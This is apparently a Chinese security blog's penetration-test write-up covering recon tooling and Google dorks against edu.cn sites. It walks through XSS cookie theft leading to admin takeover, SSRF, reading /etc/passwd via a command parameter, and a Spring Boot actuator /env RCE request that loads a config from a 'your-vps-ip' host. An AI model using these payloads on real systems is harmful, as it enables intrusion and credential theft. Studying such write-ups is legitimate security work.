#  某次内部行业渗透测试&攻防演练多个系统从资产打点到RCE漏洞  
 Say Sec   2026-01-26 01:00  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
专注于SRC漏洞挖掘、红蓝对抗、渗透测试、代码审计JS逆向，CNVD和EDUSRC漏洞挖掘，以及工具分享、前沿信息分享、POC、EXP分享。不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（课程培训限时优惠）。  
#   
  
  
01  
  
0x1   
某次内部行业渗透测试&攻防演练多个系统从资产打点到RCE漏洞  
## 0x1 前言  
  
首先声明下，本次文章分享是有渗透测试授权的，且下面的漏洞都已经被修复，文章相关图片都已经被打码了，不做任何未授权、有危害的渗透测试、漏洞挖掘、攻防行为。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sIkaIzoiaLzSjlNVKe8wTXetq0UNibEx5v5wFpJicSNflRIoNPicv5BIFEQ/640?wx_fmt=png&from=appmsg "null")  
  
周期时间是一个星期，总共提交的有效漏洞报告是18个，前几天是先进行内部的渗透测试操作，后面几天就是内部模拟攻防演练行动，最后一天就是内部钓鱼演练。  
  
这次文章主要是开始给师傅们分享目标指定的资产如何进行信息收集以及收集到对应的资产，如何快速有效的进行一个打点操作，写的都是我自己的实战经验，欢迎师傅们来交流，有些地方写的不足，希望师傅们可以补充。  
  
后面给师傅们分享的是几个案例，很多漏洞报告太明显了，就没有分享，拿几个典型的给师傅们分享即可，希望师傅们都有收获！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sRu8aTu6YKfaI2XXTYmfa1YPGHLkOFAFcHuzVgibaaOrpnApqgmCC2BA/640?wx_fmt=png&from=appmsg "null")  
## 0x2 攻防演练的简介和注意事项  
### 一、什么是攻防演练  
  
攻防演练是一种模拟真实攻击和防御的活动，旨在评估和提高组织的安全防护能力。在攻防演练中，一个团队（红队）扮演攻击者的角色，试图发起各种攻击，而另一个团队（蓝队）则扮演防御者的角色，负责检测、阻止和应对攻击。  
### 二、攻防演练的步骤  
- **规划和准备：**  
 确定演练的目标、范围和规则，制定攻击方案和防御策略，并准备相应的工具和环境。  
  
- **攻击模拟：**  
 红队使用各种攻击技术和工具，模拟真实攻击，如网络渗透、社会工程、恶意软件传播等，以测试组织的安全防护措施和响应能力。  
  
- **防御检测：**  
 蓝队负责监测和检测红队的攻击行为，使用安全监控工具和技术，如入侵检测系统（IDS）、入侵防御系统（IPS）、日志分析等，及时发现和报告攻击。  
  
- **攻防对抗：**  
 红队和蓝队之间进行攻防对抗，红队试图绕过蓝队的防御措施，而蓝队则尽力阻止和应对攻击，修复漏洞，提高安全防护能力。  
  
- **分析和总结：**  
 演练结束后，对攻击和防御过程进行分析和总结，评估组织的安全弱点和改进空间，制定相应的安全改进计划。  
  
通过攻防演练，用户可以发现和修复安全漏洞，提高安全防护能力，增强对真实攻击的应对能力，同时也可以培养和训练安全团队的技能和经验。攻防演练是一种有效的安全评估和提升手段，有助于保护组织的信息资产和业务安全。  
### 三、攻防演练常见丢分项有哪些？得分项有哪些？  
#### 常见的丢分项  
  
1.  漏洞未修复：如果目标系统存在已知漏洞，但未及时修复，红队可以利用这些漏洞进行攻击，导致丢分。  
  
2.  弱密码和默认凭证：如果目标系统使用弱密码或者默认凭证，红队可以轻易地获取系统访问权限，导致丢分。  
  
3.  安全配置不当：如果目标系统的安全配置不当，例如开放了不必要的服务或者权限设置不正确，红队可以利用这些漏洞进行攻击，导致丢分。  
  
4.  未发现攻击行为：如果蓝队未能及时发现红队的攻击行为，或者未能有效地监测和检测到攻击，导致丢分。  
  
5.  未能及时响应和阻止攻击：如果蓝队未能及时响应红队的攻击行为，未能采取有效的防御措施，导致攻击成功或者造成严重影响，会丢分。  
#### 常见的得分项  
  
1.  漏洞修复和安全补丁：如果目标系统及时修复了已知漏洞，并安装了最新的安全补丁，可以得分。  
  
2.  强密码和凭证管理：如果目标系统使用强密码，并且凭证管理得当，可以得分。  
  
3.  安全配置和权限控制：如果目标系统的安全配置正确，并且权限控制合理，可以得分。  
  
4.  发现和报告攻击行为：如果蓝队能够及时发现红队的攻击行为，并及时报告，可以得分。  
  
5.  有效的防御和响应措施：如果蓝队能够采取有效的防御措施，及时响应和阻止攻击，可以得分。  
  
得分项和丢分项的具体评判标准可能因不同的攻防演练规则和目标而有所不同。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sBKSkJ1wSHk4rQOprtTkmiaVYSOfw1ichzoJKesVzicOu6GDyj5YhJrdDQ/640?wx_fmt=png&from=appmsg "null")  
## 0x3 指定资产收集&打点思路  
### 一、信息收集/资产收集  
  
改站点的首页如下，是个公司官网，拿到这样域名，直接去信息收集一波  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2s4ArSlt1hdFN43s8CskbcZpibrbcqMRf9s1Swq5M5V9icPow3JB1XqquQ/640?wx_fmt=png&from=appmsg "null")  
  
这里先推荐去使用爱企查和风鸟这两个公司资产收集的网站，其中爱企查很多功能是收费的，但是收集的资产多，风鸟是免费的，两个一起使用效果好点  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2svAtkFKqJYRnRqrGRD9bXT0Ng2hj9hSjtyWbOt7fIgZZgI7hNNzzUhg/640?wx_fmt=png&from=appmsg "null")  
  
凤鸟还可以搜索相关的APP资产  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sdHH9Cr1PVTJXSkrjROEtgib2j3BX1XFiarSPrgfzrPbZaCE6VhY4Ibhw/640?wx_fmt=png&from=appmsg "null")  
  
首先拿公司名称到ICP/IP地址/域名信息备案管理系统搜索备案号以及备案的域名网站以及小程序、app等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sVe49WYdjmHOSOwQYA8lbSAhFQ7zFtbMX9aT8Sck0icyfbzWytnruCbQ/640?wx_fmt=png&from=appmsg "null")  
  
然后拿到备案号去使用搜索引擎搜索，再导出域名  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2s7XJV0xXVjP3g9KicOHqNwpicX0pJKl00jynKK2tQLsqnqSJNDs9j2QsQ/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2saHv4mZUCWWmGuXCNgy22s44fowY8xTKm46iay1hhRFry8Xln9TlTYyA/640?wx_fmt=png&from=appmsg "null")  
  
建议使用类型无影的相关工具搜索引擎的功能，然后一起导出，这样就可以一次性使用多个搜索引擎，且快速导出域名资产  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2snkDT5USWeic1BsNiaPziaxNBCxfhvHTUiahEJG2xSdAxZx5z5TGdcKiahow/640?wx_fmt=png&from=appmsg "null")  
  
就可以导出相关的域名了，且收集的资产要全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sGovqB9NYpTjt7ZibYIiad7sjY9RdRrtriccAK62XiblVWNXZTppt8mCoPw/640?wx_fmt=png&from=appmsg "null")  
  
最后面还可以使用ENscan这个工具去爬取网络上面的这个公司相关的资产信息，然后导出给我们  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sxRPPZ7JmYC3icqgM5xX0Nz6vXHIMoXF8EpLKzbLqUh786jC3fBO7TTg/640?wx_fmt=png&from=appmsg "null")  
  
跑出来的相关资产数据，我们就可以进行整理，然后与上面收集到的站点域名，进行汇总  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sp668dP3L0xUjaZict3KBUIu94QQ5hIGBHJh3cibLViamhK2ibFGqiaa8PPw/640?wx_fmt=png&from=appmsg "null")  
### 二、子域名/IP网段收集  
  
子域名我常用的就是灯塔ARL+oneforall+空间引擎三种方式一起收集，利用上面的方式收集主域名相关资产，放到灯塔ARL去跑  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sOwpvWrHiazjV9807Uoico1G4e4L17P423IP06EcDSL33icTib2ZN74q3Ow/640?wx_fmt=png&from=appmsg "null")  
  
然后灯塔扫描完成，就可以使用自带的导出功能进行选择数据的导出即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sqVmvvv1TqOFicqwibfY6IXISQfiao9nG6MHM0NlRvzniasibEUktZibiaRiazg/640?wx_fmt=png&from=appmsg "null")  
  
把上面保存的主域名，放到oneforall里面去跑，收集对应的子域名即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sQrw7MHV3Qh5Q9ibKOoq6n4gia0oHjNACHcS73wy4AdbftSTI7ibVsUUtw/640?wx_fmt=png&from=appmsg "null")  
  
再利用上面的空间引擎搜索到的子域名，然后用收集到的数据进行去重  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2soT8l5MEDmdl2FDgXqjMB9mXibN6k6FQxbYlD8kyXxXYibAeCX4jlibgRg/640?wx_fmt=png&from=appmsg "null")  
  
IP网段的话，推荐把上面工具手法收集到的IP资产，放到无影工具上面去资产整理即可得到IP网段  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sBtuPJzI4tG8icsFHn4Hiafnv68zu7en3ibPNGNuJMPpkGZfFrhuh75CPg/640?wx_fmt=png&from=appmsg "null")  
  
比如举例下面这个IP段，就可以这样去使用FOFA搜索，找到更多的存活域名资产  
```
ip="69.197.157.0/24" && is_domain=true
ip="69.197.157.1/20"

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sXcwhhu9uia0xthyw1qAHqsicku0V4XdKw9WmJib7HVEtRYYNvGCibFpfxg/640?wx_fmt=png&from=appmsg "null")  
### 三、资产打点  
  
这里推荐使用无影的web指纹识别，这个功能可以把我们导入的域名、IP直接进行探活和指纹检测操作  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sGmFdohYoMzoCSzVMcoG4cNFO5NbFzHX2SCDK6ARp1F8gZyibLhetRAg/640?wx_fmt=png&from=appmsg "null")  
  
这里打点很快的一个方式，就是使用灯塔扫描敏感文件泄露，这个师傅们可以先去网上搜索下修改配置文件，也就是修改里面的默认敏感文件，可以把自己收藏的大字典放上去，效果更好，可以扫描到一些敏感文件出来，具体师傅们可以参考这篇文章：  
  
https://blog.csdn.net/mashiro_hibiki/article/details/138245669，具体就是修改/app/dicts/目录下的file_top_2000.txt文件即可，下面就是我的字典文件，对应的修改下灯塔ARL的配置文件即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2s7BBQpUqCxgJDiaNbIa1LSImbOwrgTIic6akFFkJFVHlx1ln8cFFm7BHQ/640?wx_fmt=png&from=appmsg "null")  
  
如果师傅们没有安装灯塔的话，推荐师傅们看下地图大师的B站课程，安装灯塔的操作很简单，然后再进行配置相关操作，也就是上面的CSDN的博客地址即可  
```
【【地图大师src漏洞挖掘番外篇】ARL资产灯塔自救指南】 https://www.bilibili.com/video/BV14W421R77j/?share_source=copy_web&vd_source=268f8d699ac32cf11e9bdc248399c5bd

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sOaguC0RrxiaQd3nVBnQrzAyVBDj4yzZ93woIReic403uE1E7aISXlfPg/640?wx_fmt=png&from=appmsg "null")  
  
等灯塔ARL跑完，就可以在文件泄露模块去看了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sk02KD7STjgib21TWDAmU9iapRdEicCem9JGeVoLbTwA1BY6sevR23ZTlg/640?wx_fmt=png&from=appmsg "null")  
  
其次还有就是我一般喜欢在打开无影探测完的资产后，要是这个域名访问报错，或者没什么信息，我会使用Google语法来访问，有时候可以找到该站点的存活站点，从而打该站点的资产  
  
就比如你访问http://xxxxx.xxx.com这个站点，显示下面的界面报错，一般别人遇到就放弃了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sDbRAoYKhzgOsuJwTpp72y50CRDbAulFojiace2ehq0cSEagGtkZp7tg/640?wx_fmt=png&from=appmsg "null")  
  
我们可以使用Google浏览器用site:域名尝试，有时候可以找到对应站点的别的访问路径，就不会报错了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2s6ibx3sNb5T0V7JUMNmUl98U3brntHpicEicAom5d9sGtOHUknM53sTGzw/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2s7XLRjgHPgcXXtKBnpUwjMgVEzcyseUAAlqvZNOnedYiaFX36POu3VLg/640?wx_fmt=png&from=appmsg "null")  
  
下面给师傅们分享我收藏的一些Google语法：  
```
注入漏洞:
site:edu.cn inurl:id|aspx|jsp|php|asp

文件上传：
site:edu.cn inurl:file|load|editor|Files

前台登录：
site:edu.cn intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|手册|admin|login|sys|managetem|password|username

site:edu.cn inurl:login|admin|manage|manager|admin_login|login_admin|system|boss|master

敏感信息搜索:
site:edu.cn ( "默认密码" OR "学号" OR "工号")

后台接口和敏感信息探测:
site:edu.cn (inurl:login OR inurl:admin OR inurl:index OR inurl:登录) OR (inurl:config | inurl:env | inurl:setting | inurl:backup | inurl:admin | inurl:php)

查找暴露的特殊文件:
site:edu.cn filetype:txt OR filetype:xls OR filetype:xlsx OR filetype:doc OR filetype:docx OR filetype:pdf

常见的敏感文件扩展:
site:edu.cn ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess

XSS 漏洞倾向参数:
inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:& site:edu.cn

重定向漏洞倾向参数:
inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:edu.cn

SQL 注入倾向参数:
inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:& site:edu.cn

SSRF 漏洞倾向参数:
inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:& site:edu.cn

本地文件包含（LFI）倾向参数:
inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:inc= | inurl:locate= | inurl:doc= | inurl:conf= inurl:& site:edu.cn

远程命令执行（RCE）倾向参数:
inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read= | inurl:ping= inurl:& site:edu.cn

敏感参数:
inurl:email= | inurl:phone= | inurl:password= | inurl:secret= inurl:& site:edu.cn

API 文档:
inurl:apidocs | inurl:api-docs | inurl:swagger | inurl:api-explorer site:edu.cn

代码泄露:
site:pastebin.com edu.cn

云存储:
site:s3.amazonaws.com edu.cn

JFrog Artifactory:
site:jfrog.io edu.cn

Firebase:
site:firebaseio.com edu.cn

文件上传端点:
site:edu.cn "choose file"

漏洞赏金和漏洞披露程序:
"submit vulnerability report" | "powered by bugcrowd" | "powered by hackerone" site:*/security.txt "bounty"

暴露的 Apache 服务器状态:
site:*/server-status apache

WordPress:
inurl:/wp-admin/admin-ajax.php

```  
  
还有就是遇到站点打不进去，可以了解下JS相关打法，针对于自动化JS渗透测试的操作，这里我推荐师傅们使用转子这款工具，我个人觉得很强，收集JS信息非常详细，而且会进行自动分类漏洞详情，缺点就是只能在windows版本上面运行，所以要是别的操作系统的师傅们可以使用虚拟机试试。  
  
使用的话，直接执行exe文件即可，然后下面直接插入URL地址即可，我喜欢后面加一个—scan=3  
```
--cer : 过证书 / https://www.xxx.com--cer

--time=x : 超时设置 / https://www.xxx.com--time=5

--url : 自定义URL拼接 / https://www.xxx.com--url

--proxy=127.0.0.1:8080 : 过证书 / https://www.xxx.com--proxy=127.0.0.1:8080

--sleep=x : 请求的睡眠时间 / https://www.xxx.com--sleep=0.5

--scan=1-5 : 扫描深度(默认为1,最高为5) / https://www.xxx.com--scan=3

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2snaGk5hh4Gq6p2Oth0nYh0NlIgrZoNz1QeW8fbREwskGg5ibOfH2xK4g/640?wx_fmt=png&from=appmsg "null")  
  
输出的内容蛮多的，之前有个企业SRC泄露的AK/SK就是这个，直接云接管一百多个G的资产，且可以进行使用CF提权操作  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sZKm09t2lk79bKbLaVZ6ibytiafS6swXK3KkcxHibKDKlf2wicxibHreBDgg/640?wx_fmt=png&from=appmsg "null")  
  
后面就可以按照对应的URL泄露的JS文件去找泄露和未授权即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2slZibRAJ2DGJibmiaCY66ib0k7Q6LDAEibxuqesicxYTgp01eia5XSIshgvic4A/640?wx_fmt=png&from=appmsg "null")  
## 0x4 从XSS客服弹窗获取cookie到RCE  
### 一、未授权接管admin管理员权限  
  
书接上回，开始的官网有个客服的聊天功能点，猜测存在XSS漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWtMXcJeUl4UTjQgM79JdIHENibtyNzMGcavQYR6WiaCSKAPBfLbUKFDbNj1iakicia1zmpfwkbfnQNOOA/640?wx_fmt=png&from=appmsg "")  
  
直接去里面找客服聊天，然后进行输入下库存的XSS标签payload  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sUZ8T9eicMcO7ROiaw63TVX27FbtfVoPeBqLJ060ZORdTdyibmzIRxMNUA/640?wx_fmt=png&from=appmsg "null")  
  
发现可以成功弹窗，那么这里尝试下使用弹客服cookie的payload，看看能不能弹cookie进行未授权登陆客服管理员的账户  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sI5ib71vMIP64SrHG0FiaI8f3YZCR6AkAVKpIial6p50EnefZoubsKlgicQ/640?wx_fmt=png&from=appmsg "null")  
  
这里成功获取到了客服的cookie值，然后尝试登陆口替换cookie未授权登陆后台  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sxVavZ9edjNxlLqF60r4kW5d9uaQmsbvr32iaLloxwW4piaRFTgfLfiaSA/640?wx_fmt=png&from=appmsg "null")  
  
现在我们替换网站的cookie，发现可以成功登陆进去  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2stdMVgmiaFOcnkibpgjZxdjpvTtic3bUNGNGxCG9ia3ChUPzHaumYKk5AicA/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sBSQ1RM11BcylNP2eO9nib86f3NsB1XLWtsO4WUzPwAAa0XNt3picyIJw/640?wx_fmt=png&from=appmsg "null")  
  
登陆进去后发现账户上admin的管理员账户  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2su5Kco1Xc9QcVR14xic9lvyLd8rzqicx24QSjhzyfwUGRemFabB407VgA/640?wx_fmt=png&from=appmsg "null")  
### 二、后台SSRF漏洞  
  
进入后台后，发现后台有个图标管理可以进行新增操作，然后我这里尝试了XSS不行，后面就尝试打一个SSRF漏洞  
  
插入一个DNSlog的域名，来验证看看是不是存在SSRF漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2stM3A1oxdP4CyNTiaMaKe4LlPOtibjS9GQVicKYRZvQyqrT7wAwS7ZJ1bg/640?wx_fmt=png&from=appmsg "null")  
  
发现DNSlog有回显记录，说明这里存在SSRF漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sibZba25mMEyibh24kYMucfcmmDjTXu48P6SAiawG1acutjjY8JcCVZ3QA/640?wx_fmt=png&from=appmsg "null")  
### 三、后台RCE漏洞  
  
峰回路转，在这个站点找到了一个后台登陆口，且账号密码是弱口令：admin:Admin123  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sZXopbHASgDzYfNhCkQMtswYicpFedbSoE39z92eRWicTtlHerAEyW82w/640?wx_fmt=png&from=appmsg "null")  
  
然后来到后台，发现这个存在cmd传参，让人觉得这个存在一个cmd的命令执行漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2s3oxrN4ATDf7K3mxkQBh4zANLDE9M8ibndQHlLaCY2ldibT5NAdlWKrrg/640?wx_fmt=png&from=appmsg "null")  
  
然后把cmd传参的内容进行base64解密，发现是一个文件，说明是利用cmd传参命令执行读取文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sJwAvrSCsRbSianYibvdupReANiaFqmwFlywodF0TdJa3mR9ibyO09jOydg/640?wx_fmt=png&from=appmsg "null")  
  
我这里直接进行尝试读取/etc/passwd文件，base64编码再进行使用cmd传参  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sb0vovuUaDXSQrJoFyPYBSEF0aUEPAZKcMvNXEYnzorcGIBKR32DtAw/640?wx_fmt=png&from=appmsg "null")  
  
成功读取/etc/passwd文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2snxe0kpufP9684w78Bh8Bq1jpnpRd67EqydibbRa9aKO3ZUE2DYEKt2Q/640?wx_fmt=png&from=appmsg "null")  
  
Linux操作系统，执行命令获取改系统的内核版本信息  
```
../../../../../../../..//proc/version

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sIbWtiaeeg6sBZFHhtRGbmMaN6cpzksxIkuRNpoZ03vfvJYqVuQNQD1A/640?wx_fmt=png&from=appmsg "null")  
## 0x5 SpringBoot 1.x版本RCE漏洞  
  
这个漏洞案例之前比较忙单独写了一个投稿给先知社区没有收（尴尬了），单独一个漏洞比较简单了，这个是这次遇到的一个RCE漏洞，目前已经被修复了，也是当时拿着poc去跑的，然后试出来了一个。这次拿本地靶场搭建一下给师傅们演示下，跟这篇文章一起写着给师傅们分享下，大佬勿喷！  
### 一、本地环境搭建和启动  
  
这里为了方便给师傅们演示SpringBoot 2.x版本RCE漏洞，本地搭建靶场环境，可以让师傅们看到代码中这个漏洞存在的问题，后面师傅们也是可以利用FOFA和鹰图进行资产测绘，也是可以找到对应的目标资产，要是运气好点也是可以找到RCE漏洞，后面给师傅们放搜索语法。  
  
直接使用Java的开发平台IDEA来启动我们的springboot环境，首先我们先定位到这个目录文件下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sOCBbIrrJwqYTrc1ianmiaop6C5FsGLeSlux1WSiaWqBpZfa3m6dkBJheA/640?wx_fmt=png&from=appmsg "null")  
  
然后重新加载下这个项目的maven，因为开始默认没有刷新加载我们需要的Maven项目，加载完后就可以利用环境中的项目了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2seFRBGX1O5Ag0ib62bVNGibWJEfOn6XMziaIU2ZwY9icJKqeSd2Bk4CXm8A/640?wx_fmt=png&from=appmsg "null")  
  
这个配置文件就是本地启动的地址+端口，也是可以修改的，方便我们后续使用burpsuit渗透测试利用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sE9r6JD79yAUyxQH4meEnTWXPWqsgibPOjniboRW9DWfmUPic6s9xmpicmg/640?wx_fmt=png&from=appmsg "null")  
  
**接下来直接运行这个Application文件，启动Spring服务**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sF8fRMC1yzIoL51VybZ8yMjcYt95Lb8gKaCxiaVbzrxJH7rh7tYtEpfQ/640?wx_fmt=png&from=appmsg "null")  
  
**访问web服务：****http://127.0.0.1:9092/**  
，可以看到这个就是经典的springboot界面了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sheicDThfPJXzmHABwd6uzOurP2WvsGeq8lFrbicR8XYp7CyJnMrQA7SQ/640?wx_fmt=png&from=appmsg "null")  
### 二、漏洞利用  
#### 1、spring漏洞版本验证  
  
首先，我们漏洞利用之前，需要先判断这个的spring版本，有spring 1.x和spring 2.x的版本  
  
一般直接访问：  
```
/env有数据的，spring 1.x版本
/actuator/env有数据的 ，spring 2.x版本

```  
  
像这个基本上就是spring 1.x，直接访问/env有数据的，界面如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sa4Cka3Q3rJt2QFUO4B4ZFKaiaic9LplOdaVAXYnvnpbjiblNDUiar1BReA/640?wx_fmt=png&from=appmsg "null")  
#### 2、测试是否存在RCE漏洞  
  
**1、 设置 spring.cloud.bootstrap.location 属性**  
  
首先先使用bp抓包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sv0WK4sBh8EObTS6qa0Rjhec5GmIvoxAy61LuBZp7cNSgMonNCW1r4w/640?wx_fmt=png&from=appmsg "null")  
  
修改成POST，修改Content-Type  
和spring.cloud.bootstrap.location  
参数  
```
POST /env HTTP/1.1
Host: 127.0.0.1:9092
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

spring.cloud.bootstrap.location=http://DNSlog域名

```  
  
spring 1.x  
```
POST /env
Content-Type: application/x-www-form-urlencoded
spring.cloud.bootstrap.location=http://your-vps-ip/example.yml

```  
  
spring 2.x  
```
POST /actuator/env
Content-Type: application/json
{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/example.yml"}

```  
  
**配置好以后，发送数据包**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2svz9Su4Ghfc3DxYiaicVMF50BLYT2FEuXyjtVWjiaib16YJxmTnUBDaDnCw/640?wx_fmt=png&from=appmsg "null")  
  
成功在/env显示成功了，配置成功  
  
